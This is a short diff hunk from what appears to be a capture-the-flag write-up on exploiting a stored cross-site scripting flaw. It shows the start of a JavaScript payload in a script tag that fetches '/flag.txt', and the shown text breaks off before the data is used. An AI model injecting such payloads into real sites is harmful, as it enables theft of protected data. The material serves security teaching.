@@ -124,7 +124,7 @@ The next step was to craft a payload capable of retrieving the protected resourc
 
 To exploit the stored XSS, I crafted a payload to retrieve the protected resource:
 
-"<script> <br>
+#<script> <br>
 fetch('/flag.txt') <br>
   .then(response => response.text())  <br>
   .then(data => {  <br>
